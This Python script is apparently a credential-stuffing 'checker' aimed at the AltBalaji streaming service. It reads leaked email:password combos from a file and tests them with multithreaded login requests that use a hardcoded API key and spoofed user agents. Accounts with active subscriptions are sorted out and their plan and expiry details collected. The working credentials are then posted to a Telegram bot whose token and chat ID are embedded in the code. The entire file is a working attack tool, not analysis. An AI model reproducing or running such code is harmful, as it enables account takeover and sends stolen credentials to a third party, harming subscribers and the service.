import os
import requests
import threading
import time
import json
from fake_useragent import UserAgent
from datetime import datetime

def Banner():
    os.system('cls')
    print('''
 █████╗ ██╗  ████████╗ ██████╗  █████╗ ██╗      █████╗      ██╗██╗
██╔══██╗██║  ╚══██╔══╝ ██╔══██╗██╔══██╗██║     ██╔══██╗     ██║██║
███████║██║     ██║    ██████╔╝███████║██║     ███████║     ██║██║
██╔══██║██║     ██║    ██╔══██╗██╔══██║██║     ██╔══██║██   ██║██║
██║  ██║███████╗██║    ██████╔╝██║  ██║███████╗██║  ██║╚█████╔╝██║
╚═╝  ╚═╝╚══════╝╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚════╝ ╚═╝
                                                                       
            [+] Developed by DE3P4K [+]
    ''')

def AltBalaji(lines):
    for line in lines:
        try:
            email, password = line.strip().split(':')
        except:
            continue
        ua = UserAgent().random

        url = 'https://payment-ms.cloud.altbalaji.com/v1/accounts/login/email?domain=IN'

        payload = {
            "username": f'{email}',
            "password": f'{password}'
        }

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://www.altbalaji.com',
            'pp-ms-api-key': 'ktKmSDIzsBqABI7Q/yOA/EEyOJRnzeeJ1GzgUKwIo5oY1o8eUKZxV1oOXfLUMCgyXBShruOnWE8s8sxFHu+olw==',
            'pp-ms-id': '5b98affc-fdaf-40ba-8090-5d4aff1b7add',
            'referer': 'https://www.altbalaji.com/',
            'sec-ch-ua': 'Not;A Brand";v="99\", "Google Chrome";v="97", "Chromium";v="97"',
            'user-agent': f'{ua}'
        }

        try:
            response = requests.post(url=url, headers=headers, data=payload)
            
            if 'Username not found' in response.text or 'code":404' in response.text or 'Username and password do not match' in response.text or 'Bad request data' in response.text:
                pass
            elif 'session_token' in response.text or 'id' in response.text or 'login' in response.text:
                token = json.loads(response.text)
                token = token['session_token']

                loginurl = 'https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=50'

                loginheaders = {
                    'origin': 'https://www.altbalaji.com',
                    'referer': 'https://www.altbalaji.com/',
                    'user-agent': f'{ua}',
                    'xssession': f'{token}'
                }

                loginresponse = requests.get(url=loginurl, headers=loginheaders)
                data = json.loads(loginresponse.text)
                strdata = json.dumps(data)
                
                if '"orders": [], "count"' in strdata:
                    print(f'[FREE] {email}:{password}')
                elif 'status":"closed' in strdata:
                    print(f'[EXPIRED] {email}:{password}')
                elif '"orders": [{"id":' in strdata:
                    print(f'[VALID] {email}:{password}')

                    plan = data['orders'][0]['product']['titles']['default']
                    price = data['orders'][0]['price']['real_amount']
                    validity = data['orders'][0]['dates']['valid_to']
                    expiry = datetime.fromisoformat(validity).date()

                    TELEGRAM_API_URL = f'https://api.telegram.org/bot{bot_token}/sendMessage'

                    tgdata = {
                                'chat_id': f'{chat_id}',
                                'parse_mode' : 'Markdown',
                                'text': f'*AltBalaji Checker by @DE3P4K07*\n\n`{email}`:`{password}`\n_Plan : {plan}_\n_Amount : {price}_\n_Expiry : {expiry}_'
                            }
                    tgres = requests.post(TELEGRAM_API_URL, data=tgdata)
                
            else:
                pass

        except:
            pass


def divide_chunks(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]


lines = []
with open("combo.txt", "r", encoding='utf-8') as combo:
    for line in combo:
        lines.append(line)

Banner()
print('Put your Combos in combo.txt file.\n')
thread_count = int(input('Number of Threads (Keep it under 100): '))

Banner()
print('Hits will be sent to Telegram\n')
# bot_token = input('Enter Bot Token obtained from BotFather : ')
bot_token = '1711204486:AAEX_laashiVUibi6u-GnDezXnmsn3pviis'
# chat_id = input('Enter CHAT ID : ')
chat_id = '-1001690147348'
print('Alright, Sit Back and Relax. :)')
time.sleep(1)

Banner()
line_count = len(lines)
lines_per_thread = (line_count + thread_count - 1) // thread_count

chunked_lines = list(divide_chunks(lines, lines_per_thread))

threads = []

for i in range(thread_count):
    t = threading.Thread(target=AltBalaji, args=[chunked_lines[i]])
    t.start()
    threads.append(t)

for t in threads:
    t.join()

combo.close

input('\n\nDone.Press Enter to Exit.')
